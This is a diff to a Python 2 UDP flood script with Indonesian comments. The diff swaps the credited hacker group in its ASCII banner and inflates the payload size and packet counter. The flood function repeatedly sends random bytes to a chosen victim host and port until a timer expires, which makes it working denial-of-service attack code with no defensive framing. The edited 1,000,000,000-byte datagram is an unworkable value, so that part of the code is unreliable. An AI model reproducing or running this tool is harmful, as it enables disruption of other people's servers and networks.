@@ -13,7 +13,7 @@ def usage():
     print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
     print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
     print "#                   ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m######            #"
-    print "#               \033[1;91m<--[Indonesia Security Lite]-->         \033[1;32m#"
+    print "#               \033[1;91m<--[Surabaya Cyber Team]-->         \033[1;32m#"
     print "#########################################################"
     print "                        @@@@@@@@@@"
     print "                       @@@@@@@@@@@@"
@@ -23,9 +23,9 @@ def flood(victim, vport, duration):
     # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 20000 representasi satu byte ke server
-    bytes = random._urandom(20000)
+    bytes = random._urandom(1000000000)
     timeout =  time.time() + duration
-    sent = 3000
+    sent = 10000000
 
     while 1:
         if time.time() > timeout:
@@ -33,7 +33,7 @@ def flood(victim, vport, duration):
         else:
             pass
         client.sendto(bytes, (victim, vport))
-        sent = sent + 1
+        sent = sent + 10
         print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
